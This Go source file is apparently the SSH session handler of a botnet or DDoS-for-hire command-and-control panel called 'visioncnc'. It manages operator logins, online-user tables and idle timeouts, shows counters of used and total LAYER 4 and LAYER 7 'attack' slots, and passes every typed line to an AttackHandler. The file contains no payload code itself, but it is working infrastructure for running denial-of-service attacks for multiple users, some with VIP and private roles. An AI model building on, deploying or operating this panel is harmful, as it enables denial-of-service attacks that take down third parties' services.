package handlers

import (
	"fmt"
	"io"
	"log"
	"strconv"
	"strings"
	"sync"
	"text/tabwriter"
	"time"
	"visioncnc/database"
	"visioncnc/utils"

	"github.com/gliderlabs/ssh"
	"github.com/mattn/go-shellwords"
	"golang.org/x/crypto/ssh/terminal"
	"golang.org/x/term"
)

var OnlineUsers = 0

var (
	OnlineUsernames []string
	mu              sync.Mutex
)
var UserConnectionTimes = make(map[string]time.Time)

var ActiveSessions = make(map[string]ssh.Session)
var sessionMu sync.Mutex // Protects ActiveSessions map

// AddUser adds a username to the online list
func AddUser(username string) {
	mu.Lock()
	defer mu.Unlock()
	for _, user := range OnlineUsernames {
		if user == username {
			return
		}
	}
	OnlineUsernames = append(OnlineUsernames, username)
	OnlineUsers++
	UserConnectionTimes[username] = time.Now()
}

// RemoveUser removes a username from the online list and closes active session
func RemoveUser(username string) {
	mu.Lock()
	defer mu.Unlock()

	for i, user := range OnlineUsernames {
		if user == username {
			OnlineUsernames = append(OnlineUsernames[:i], OnlineUsernames[i+1:]...)
			OnlineUsers--
			delete(UserConnectionTimes, username)
			break
		}
	}

	sessionMu.Lock()
	if session, ok := ActiveSessions[username]; ok {
		session.Close()
		delete(ActiveSessions, username)
	}
	sessionMu.Unlock()
}

// IsUserOnline checks if a user is already online
func IsUserOnline(username string) bool {
	mu.Lock()
	defer mu.Unlock()
	for _, user := range OnlineUsernames {
		if user == username {
			return true
		}
	}
	return false
}

// SessionHandler manages the lifecycle of an SSH user session
func SessionHandler(db *database.Database, session ssh.Session) {
	username := session.User()
	utils.Init()

	sessionMu.Lock()
	existingSession, hasExisting := ActiveSessions[username]
	sessionMu.Unlock()

	if hasExisting {
		term := terminal.NewTerminal(session, "")
		term.Write([]byte("You have an active session already. Disconnect the other session? [y/n]: "))
		response, _ := term.ReadLine()

		if strings.ToLower(response) == "y" {
			log.Printf("Disconnecting existing session for user %s", username)
			existingSession.Close()
			RemoveUser(username)

			log.Printf("\033[32mSuccessful\033[0m SSH Connection from: \033[34m%s\033[0m@\033[34m%s\033[0m using \033[34m%s\033[0m", username, session.RemoteAddr().String(), session.Context().ClientVersion())

			sessionMu.Lock()
			ActiveSessions[username] = session
			sessionMu.Unlock()

			AddUser(username)
			term.Write([]byte("Previous session disconnected. Welcome to your new session.\n"))
		} else {
			term.Write([]byte("Session login canceled.\n"))
			return
		}
	} else {
		log.Printf("\033[32mSuccessful\033[0m SSH Connection from: \033[34m%s\033[0m@\033[34m%s\033[0m using \033[34m%s\033[0m", username, session.RemoteAddr().String(), session.Context().ClientVersion())
		AddUser(username)

		sessionMu.Lock()
		ActiveSessions[username] = session
		sessionMu.Unlock()
	}

	// Load config (non-fatal on error)
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		log.Printf("failed to load config: %v", err)
		session.Write([]byte("Internal error loading config\r\n"))
		RemoveUser(username)
		return
	}

	userInfo := db.GetAccountInfo(username)
	userIp := session.RemoteAddr().String()

	// First-time password setup if IP not registered
	if !db.CheckIfIpExists(userInfo.Username) {
		t := terminal.NewTerminal(session, "")
		t.Write([]byte("Please type a new password: "))
		password, _ := t.ReadPassword("")
		t.Write([]byte("Please retype the password: "))
		password2, _ := t.ReadPassword("")

		if password != password2 {
			t.Write([]byte("Passwords do not match\n"))
			RemoveUser(username)
			return
		}

		if len(password) < config.PasswordMinLength {
			t.Write([]byte(fmt.Sprintf("Password must be at least %d characters\n", config.PasswordMinLength)))
			RemoveUser(username)
			return
		}

		db.ChangePassword(userInfo.Username, password)
	}

	db.UpdateIp(userInfo.Username, userIp)

	// Build branding data and render prompt
	brandingData := BuildBrandingData(session, db)
	customPrompt := utils.Branding(session, "prompt", brandingData)
	termSession := term.NewTerminal(session, customPrompt)

	// Render welcome splash
	welcomeData := BuildBrandingData(session, db)
	welcomeMessage := utils.Branding(session, "home-splash", welcomeData)
	utils.SendMessage(session, welcomeMessage, true)

	// Periodic title updater
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			titleData := BuildBrandingData(session, db)
			titleData["cnc.Totalslots"] = strconv.Itoa(config.Global_slots)
			titleData["cnc.Online"] = strconv.Itoa(OnlineUsers)
			titleData["cnc.Usedslots"] = strconv.Itoa(db.GetCurrentAttacksLength())
			titleData["cnc.UsedL4Slots"] = strconv.Itoa(db.GetCurrentAttacksLengthByGroup("LAYER 4"))
			titleData["cnc.TotalL4Slots"] = strconv.Itoa(config.Layer_slots["LAYER 4"])
			titleData["cnc.UsedL7Slots"] = strconv.Itoa(db.GetCurrentAttacksLengthByGroup("LAYER 7"))
			titleData["cnc.TotalL7Slots"] = strconv.Itoa(config.Layer_slots["LAYER 7"])
			utils.SetTitle(session, utils.Branding(session, "title", titleData))
		}
	}()

	// Idle session timeout
	var lastActivityMu sync.Mutex
	lastActivity := time.Now()
	if config.IdleTimeoutMinutes > 0 {
		timeout := time.Duration(config.IdleTimeoutMinutes) * time.Minute
		go func() {
			ticker := time.NewTicker(30 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-session.Context().Done():
					return
				case <-ticker.C:
					lastActivityMu.Lock()
					idle := time.Since(lastActivity)
					lastActivityMu.Unlock()
					if idle > timeout {
						session.Write([]byte("\r\nIdle timeout reached. Disconnecting...\r\n"))
						session.Close()
						return
					}
				}
			}
		}()
	}

	commandHandler := NewCommandHandler(db, session)

	for {
		line, err := termSession.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Printf("Error reading input: %v", err)
			break
		}

		// Update idle activity timestamp
		lastActivityMu.Lock()
		lastActivity = time.Now()
		lastActivityMu.Unlock()

		line = strings.ToLower(line)
		args, _ := shellwords.Parse(line)

		if line == "" || len(args) == 0 {
			continue
		}

		AttackHandler(db, session, args, config)

		if line == "exit" || line == "quit" || line == "q" || line == "logout" {
			termSession.Write([]byte("Goodbye!\n"))
			break
		}

		if line == "online" {
			var output strings.Builder
			DisplayOnlineUsers(db, session, &output)
			termSession.Write([]byte(output.String()))
			continue
		}

		commandHandler.ExecuteCommand(line, termSession)
	}

	RemoveUser(username)
	sessionMu.Lock()
	delete(ActiveSessions, username)
	sessionMu.Unlock()
}

// DisplayOnlineUsers renders a table of currently connected users
func DisplayOnlineUsers(db *database.Database, session ssh.Session, output io.Writer) {
	theme := utils.GetTheme()
	w := tabwriter.NewWriter(output, 0, 0, 2, ' ', 0)

	fmt.Fprintf(w, "%s#\tUsername        \tConnected   \tRoles%s\n", theme.Colors.TableHeader, theme.Colors.Reset)
	fmt.Fprintf(w, "%s--\t-------------- \t------------ \t--------------%s\n", theme.Colors.TableHeader, theme.Colors.Reset)

	for index, user := range OnlineUsernames {
		userInfo := db.GetAccountInfo(user)
		roleLabels := utils.GenerateRoleLabels(userInfo.Admin, userInfo.Vip, userInfo.Private)

		connectionTime, exists := UserConnectionTimes[user]
		if !exists {
			connectionTime = time.Now()
		}
		activityTimeStr := formatDuration(time.Since(connectionTime))

		fmt.Fprintf(w, "%s%d\t %s\t %s\t %s\t%s\n",
			theme.Colors.Info, index+1, userInfo.Username, activityTimeStr, roleLabels, theme.Colors.Reset)
	}

	w.Flush()
}

func formatDuration(d time.Duration) string {
	h := d / time.Hour
	d -= h * time.Hour
	m := d / time.Minute
	d -= m * time.Minute
	s := d / time.Second
	return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
}
